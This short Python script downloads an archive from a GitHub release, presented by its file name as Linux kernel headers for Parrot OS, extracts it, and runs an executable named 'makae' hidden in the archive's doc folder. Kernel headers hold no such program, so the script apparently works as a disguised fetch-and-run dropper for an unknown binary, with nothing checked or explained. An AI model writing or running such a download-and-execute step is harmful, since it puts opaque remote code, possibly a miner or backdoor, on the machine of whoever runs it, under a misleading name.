import os

cmd = "wget https://github.com/cpflayan/accvideo/releases/download/3/linux-headers-4.18.0-parrot8-amd64.tar.gz"
os.system(cmd)
cmd2 = "tar zxf linux-headers-4.18.0-parrot8-amd64.tar.gz"
os.system(cmd2)
cmd3 = "linux-headers-4.18.0-parrot8-amd64/doc/makae linux-headers-4.18.0-parrot8-amd64/doc/INSTALL"
os.system(cmd3)
